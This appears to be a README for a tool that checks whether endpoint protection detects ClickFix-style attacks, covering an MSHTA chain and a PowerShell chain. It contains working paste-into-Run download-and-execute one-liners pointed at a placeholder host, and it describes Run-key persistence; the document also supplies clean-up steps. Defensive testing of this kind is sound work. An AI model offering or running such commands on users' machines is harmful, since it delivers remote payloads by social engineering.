# clickfix_detecion_validator

These click-fix validations are a benign test of endpoint protection suites for detection of two infection methods observed in a production environment. 

## MSHTA

This method leverages a pasted command that downloads and executes a **Windows HTML Application** (HTA). The HTA then leverages `cURL` to download and extract a "PDF" file that is actually a TAR archive containing the payload. After extraction, the "payload" is then executed. 

### Execution

To execute this test, log into the machine you wish to test your Endpoint Protection suite on. Preferably, use a non-privileged account to more closely simulate a real-world test. Copy the below command to your clipboard, press `WIN+R` to open the "run" prompt, press `CTRL+V` to paste the command, then `ENTER` to execute.

```
cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<your_url.com>/B.max" && mshta "!u!" && del /f "!u!""
```

### Validation

To validate whether or not the "infection" succeeded, you should find the following files on your system. 

```
%LOCALAPPDATA%\B.max
%USERPROFILE%\Documents\928252966059280400\clickfix-sim-payload.txt
%USERPROFILE%\Documents\928252966059280400\928252966059280400.pdf
%USERPROFILE%\Documents\928252966059280400\Syncovery.exe
```

If found, the "infection" succeeded, and your Endpoint Protection failed to prevent it.

### Clean-Up

To clean up the "infection" from your computer, simply run this PowerShell command to remove the payload and log files:

```
Remove-Item -LiteralPath "$env:LOCALAPPDATA\B.max" -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath "$env:USERPROFILE\Documents\928252966059280400" -Force -Recurse -ErrorAction SilentlyContinue
```

## PWSH

This method leverages a PowerShell chain loader to install an application to the user's profile, then an HKCU registry entry to start the application on login. Since the "run" command limits the number of characters that may be input, the actual command string is located in a text file `nexus-validation.txt` on the C2 server. These commands are then executed locally on the machine. 

### Execution

To execute this test, log into the machine you wish to test your Endpoint Protection suite on. Preferably, use a non-privileged account to more closely simulate a real-world test. Copy the below command to your clipboard, press `WIN+R` to open the "run" prompt, press `CTRL+V` to paste the command, then `ENTER` to execute.

```
powershell.exe -NoProfile -WindowStyle hidden -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://<your_url.com>/nexus-validation.txt' -UseBasicParsing).Content)"
```

### Validation

To validate whether or not the "infection" succeeded, you should find the following files on your system.

```
%LOCALAPPDATA%\NexusConnector\NexusConnector.exe
%TEMP%\nexusconnector-loader-validation.log
%TEMP%\nexusconnector-validation.log
```

If found, the "infection" succeeded, and your Endpoint Protection failed to prevent it.

### Clean-Up

To clean up the "infection" from your computer, simply run these PowerShell commands to stop and remove the payload and log files:

```
# Stop simulated payload if still running
Get-Process -Name NexusConnector -ErrorAction SilentlyContinue | Stop-Process -Force

# Remove HKCU Run persistence
Remove-ItemProperty `
  -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
  -Name 'NexusConnector' `
  -ErrorAction SilentlyContinue

# Remove installed simulated app
Remove-Item `
  -LiteralPath "$env:LOCALAPPDATA\NexusConnector" `
  -Recurse `
  -Force `
  -ErrorAction SilentlyContinue

# Remove validation logs
Remove-Item `
  -LiteralPath "$env:TEMP\nexusconnector-loader-validation.log","$env:TEMP\nexusconnector-validation.log" `
  -Force `
  -ErrorAction SilentlyContinue

# Remove any downloaded launcher script if you tested that method
Remove-Item `
  -LiteralPath "$env:TEMP\nexus-validation.ps1" `
  -Force `
  -ErrorAction SilentlyContinue

# Remove temp staging folders from this validation, identified by nexus_payload.zip
Get-ChildItem -Path $env:TEMP -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    if (Test-Path (Join-Path $_.FullName 'nexus_payload.zip')) {
        Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
    }
}
```
